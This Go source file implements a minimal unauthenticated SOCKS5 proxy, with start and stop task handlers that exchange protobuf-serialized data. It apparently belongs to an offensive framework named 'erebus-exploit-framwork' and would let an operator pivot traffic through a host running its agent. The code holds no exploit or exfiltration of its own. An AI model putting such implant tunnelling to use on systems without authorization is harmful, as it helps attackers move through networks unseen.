package tasks

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"sync"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/protobuf/proto"
)

var (
	socksMu      sync.Mutex
	socksRunning bool
	socksLn      net.Listener
)

// SocksActive returns true if the SOCKS proxy is running.
func SocksActive() bool {
	socksMu.Lock()
	defer socksMu.Unlock()
	return socksRunning
}

func executeSocksStart(_ context.Context, data []byte) ([]byte, error) {
	task := &pb.SocksStartTask{}
	if len(data) > 0 {
		proto.Unmarshal(data, task)
	}

	port := task.Port
	if port == 0 {
		port = 1080
	}

	socksMu.Lock()
	defer socksMu.Unlock()

	if socksRunning {
		return proto.Marshal(&pb.SocksStartResult{Success: true, Port: port})
	}

	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return nil, fmt.Errorf("socks listen: %w", err)
	}

	socksRunning = true
	socksLn = ln

	go socksAcceptLoop(ln)

	result := &pb.SocksStartResult{Success: true, Port: port}
	return proto.Marshal(result)
}

func executeSocksStop(_ context.Context, _ []byte) ([]byte, error) {
	socksMu.Lock()
	defer socksMu.Unlock()

	if !socksRunning {
		return proto.Marshal(&pb.SocksStopResult{Success: true})
	}

	if socksLn != nil {
		socksLn.Close()
		socksLn = nil
	}
	socksRunning = false

	return proto.Marshal(&pb.SocksStopResult{Success: true})
}

func socksAcceptLoop(ln net.Listener) {
	defer func() {
		socksMu.Lock()
		socksRunning = false
		socksMu.Unlock()
	}()

	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go handleSocksConn(conn)
	}
}

// handleSocksConn implements a minimal SOCKS5 proxy.
func handleSocksConn(conn net.Conn) {
	defer conn.Close()

	// Read version/methods
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}

	// No auth required
	conn.Write([]byte{0x05, 0x00})

	// Read connect request
	n, err = conn.Read(buf)
	if err != nil || n < 7 || buf[1] != 0x01 {
		conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	var target string
	switch buf[3] {
	case 0x01: // IPv4
		if n < 10 {
			return
		}
		target = fmt.Sprintf("%d.%d.%d.%d:%d", buf[4], buf[5], buf[6], buf[7],
			uint16(buf[8])<<8|uint16(buf[9]))
	case 0x03: // Domain
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			return
		}
		domain := string(buf[5 : 5+domainLen])
		port := uint16(buf[5+domainLen])<<8 | uint16(buf[5+domainLen+1])
		target = fmt.Sprintf("%s:%d", domain, port)
	case 0x04: // IPv6
		if n < 22 {
			return
		}
		target = fmt.Sprintf("[%x:%x:%x:%x:%x:%x:%x:%x]:%d",
			uint16(buf[4])<<8|uint16(buf[5]),
			uint16(buf[6])<<8|uint16(buf[7]),
			uint16(buf[8])<<8|uint16(buf[9]),
			uint16(buf[10])<<8|uint16(buf[11]),
			uint16(buf[12])<<8|uint16(buf[13]),
			uint16(buf[14])<<8|uint16(buf[15]),
			uint16(buf[16])<<8|uint16(buf[17]),
			uint16(buf[18])<<8|uint16(buf[19]),
			uint16(buf[20])<<8|uint16(buf[21]))
	default:
		conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	remote, err := net.Dial("tcp", target)
	if err != nil {
		conn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		log.Printf("[socks] connect to %s failed: %v", target, err)
		return
	}
	defer remote.Close()

	// Success response
	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	// Bidirectional relay
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		io.Copy(remote, conn)
	}()
	go func() {
		defer wg.Done()
		io.Copy(conn, remote)
	}()
	wg.Wait()
}
